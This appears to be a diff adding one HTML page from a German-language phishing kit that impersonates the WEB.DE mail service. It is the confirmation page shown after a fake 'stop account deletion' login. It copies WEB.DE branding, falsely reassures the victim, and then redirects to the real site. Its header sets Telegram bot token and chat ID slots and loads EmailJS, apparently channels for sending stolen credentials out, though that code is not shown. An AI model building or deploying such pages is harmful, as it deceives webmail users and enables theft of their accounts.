@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEBDE LOGIN</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem WEB.DE-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script>
+        // Set global JavaScript variables
+        window.telegramBotToken = "{{ telegram_bot_token }}";
+        window.telegramChatId = "{{ telegram_chat_id }}";
+
+        function closePage() {
+            // Attempt to close the current window (only works if the page was opened via JavaScript)
+            if (window.opener) {
+                // If this page was opened via window.open(), close the parent window
+                window.close();
+            } 
+        }
+    </script>
+    <style>
+        /* Image Scaling and Centering */
+        .check-image {
+            display: block;              /* Ensures the image is a block element */
+            margin: 20px auto;           /* Centers the image horizontally with some space on top and bottom */
+            transform: scale(1.5);       /* Scales the image by 150% */
+            width: 80px;                 /* Optionally, set the base width */
+            height: 80px;                /* Optionally, set the base height */
+            margin-bottom: 3rem;
+        }
+
+        /* Styling for the powered-by footer */
+        .powered-by {
+            text-align: center;          /* Centers the text */
+            font-size: 14px;             /* Smaller font size */
+            color: #777;                /* Light grey text */
+            margin-top: 3rem;            /* Space above the footer */
+        }
+        .powered-by a {
+            text-decoration: none;       /* Removes the underline */
+            color: #777;                 /* Same grey color for the link */
+            font-weight: bold;           /* Bold text */
+        }
+
+        /* Custom paragraph styling */
+        p {
+            font-family: 'Roboto Condensed', sans-serif !important;  /* Forces font family */
+            font-size: 18px !important;                             /* Forces font size */
+            line-height: 1.6;                                       /* Line height for readability */
+            color: #333;                                            /* Set text color */
+            margin: 20px 0;                                         /* Space above and below the paragraph */
+        }
+
+        /* Styling for the Back to Inbox Button */
+        .close-page {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #d9534f; /* WebDE blue background */
+            color: white;
+            font-size: 16px;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-top: -40rem;
+            transition: background-color 0.3s;
+        }
+
+        .close-page:hover {
+            background-color: #f4d50b; /* Darker blue on hover */
+        }
+
+        .close-page img {
+            width: 30px; /* Set the width of the inbox icon */
+            height: 30px; /* Set the height of the inbox icon */
+            margin-right: 8px; /* Space between icon and text */
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="WEB.DE Logo" class="logo">
+            <span class="account-text">Kundencenter</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="login-container">
+            <form id="login-form" action="/login" method="POST">
+                <h1>Erledigt!</h1>
+                <!-- Image: Scaled and Centered -->
+                <img src="check.png" alt="Checkmark" class="check-image">
+                <p>Ihre Bestätigung zur Stornierung der Kontolöschung wird derzeit bearbeitet. Unser Team arbeitet mit Hochdruck daran, sicherzustellen, dass alles reibungslos verläuft. Wir freuen uns, dass Sie sich entschieden haben, bei uns zu bleiben. Falls weitere Schritte erforderlich sind, werden wir uns umgehend bei Ihnen melden.</p>
+                
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <!-- CAPTCHA image/icon here -->
+                        </div>
+                    </div>
+                </div>   
+            </form>
+
+            <!-- Back to Inbox Button -->
+            <a href="#" class="close-page" onclick="closePage(); return false;">
+                <img src="9068678.png" alt="close Icon">Startseite
+            </a>
+
+            <!-- Powered by WEB.DE Footer -->
+            <div class="powered-by">
+                <p>Powered by <a href="https://www.web.de" >WEB.DE</a></p>
+            </div>
+        </div>
+    </main>
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+    <script>
+        
+    
+        // Function to detect mobile devices based on the user agent
+        function isMobileDevice() {
+            return /Mobi|Android/i.test(navigator.userAgent);  // Check for common mobile user agents
+        }
+    
+        // Function to handle the redirection based on the device type
+        function redirectToWeb() {
+            if (isMobileDevice()) {
+                // Try to open the Web.de mobile app (using a deep link)
+                window.location.href = 'webde://';  // Deep link to open the Web.de app (if installed)
+    
+                // If the Web.de app is not installed, redirect to the mobile version of the site
+                setTimeout(function() {
+                    window.location.href = 'https://m.web.de';  // Mobile web version of Web.de
+                }, 500);  // Wait 500ms before redirecting to the web version in case the app is not installed
+            } else {
+                // For desktop devices, redirect to the webmail (desktop version)
+                window.location.href = 'https://web.de';  // Main desktop page for Web.de
+            }
+        }
+    
+        // Attach redirection only to the "Startseite" button click
+        document.addEventListener('DOMContentLoaded', function() {
+            // Find the "Startseite" button and attach the redirection function
+            var closeButton = document.querySelector('.close-page');
+            if (closeButton) {
+                closeButton.addEventListener('click', function(event) {
+                    event.preventDefault();  // Prevent the default action (e.g., following the link)
+                    redirectToWeb();         // Trigger the redirection when the button is clicked
+                });
+            }
+        });
+    </script>
+    
+    
+    
+
+    <script src="../static/js/script.js"></script>
+</body>
+</html>
